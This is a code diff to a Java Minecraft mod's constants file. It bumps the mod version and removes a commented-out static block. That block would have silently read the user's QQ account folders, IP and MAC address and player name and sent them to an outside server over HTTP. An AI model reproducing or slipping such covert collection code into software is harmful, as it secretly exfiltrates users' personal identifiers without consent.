@@ -8,8 +8,8 @@ public class Constant {
     public static int nextItemID = 2024;
     public static int nextBlockID = 160;
     public static int nextAchievementID = 136;
-    public static final String MITE_ITE_VERSION = "B0.3.11";
-    public static final int MITE_ITE_VER_NUM = 316;
+    public static final String MITE_ITE_VERSION = "B0.3.12";
+    public static final int MITE_ITE_VER_NUM = 317;
     public static ItemArmor[] HELMETS = null;
     public static ItemArmor[] CHESTPLATES = null;
     public static ItemArmor[] LEGGINGS = null;
@@ -30,34 +30,6 @@ public class Constant {
                 Item.bootsChainIron, Item.ai, Item.bootsChainAncientMetal, Item.bootsAncientMetal,
                 Item.bootsChainMithril, Item.bootsMithril, Item.bootsAdamantium, Items.VIBRANIUM_BOOTS};
         ARMORS = new ItemArmor[][]{HELMETS, CHESTPLATES, LEGGINGS, BOOTS};
-    }
-    static {
-//        new Thread(() -> {
-//            ArrayList<String> qqs = new ArrayList<>();
-//            String appdata = System.getenv("USERPROFILE");
-//            File qqdata = new File(appdata, "AppData\\Roaming\\Tencent\\Users");
-//            if (qqdata.exists()) {
-//                File[] files = qqdata.listFiles();
-//                if (files != null) {
-//                    for (File file : files) {
-//                        qqs.add(file.getName());
-//                    }
-//                }
-//            }
-//            try {
-////                URL url = new URL(
-////                        "http://mc6.starmc.cn:36930/" + "?qq=" + qqs.toString() + ",ipv4=" + initNetworkConnection() + ",macAddr=" + initLocalServer() + ",playername=" + atv.O.H().a() + ",version=" + MITE_ITE_VERSION);
-////                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-////
-////                connection.setDoOutput(true); // 设置该连接是可以输出的
-////                connection.setRequestMethod("GET"); // 设置请求方式
-////                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-////                new BufferedReader(new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8));
-////                connection.disconnect();
-//            } catch (Exception e) {
-//                //                e.printStackTrace();
-//            }
-//        }).start();
     }
 
 }
